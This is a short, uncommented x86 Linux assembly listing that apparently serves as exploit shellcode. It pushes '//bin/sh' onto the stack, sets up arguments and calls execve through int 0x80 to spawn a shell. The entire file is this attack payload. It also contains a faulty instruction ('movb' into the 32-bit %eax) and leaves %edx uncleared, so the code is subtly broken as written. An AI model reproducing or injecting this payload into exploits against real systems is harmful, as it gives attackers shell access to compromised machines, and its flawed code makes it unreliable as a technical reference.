.section .text
.globl _start
_start:
	xorl %eax, %eax
	pushl %eax
	pushl $0x68732f6e
	pushl $0x69622f2f
	movl %esp, %ebx
	pushl %eax
	pushl %ebx
	movl %esp, %ecx
	movb $0xb, %eax
	int $0x80
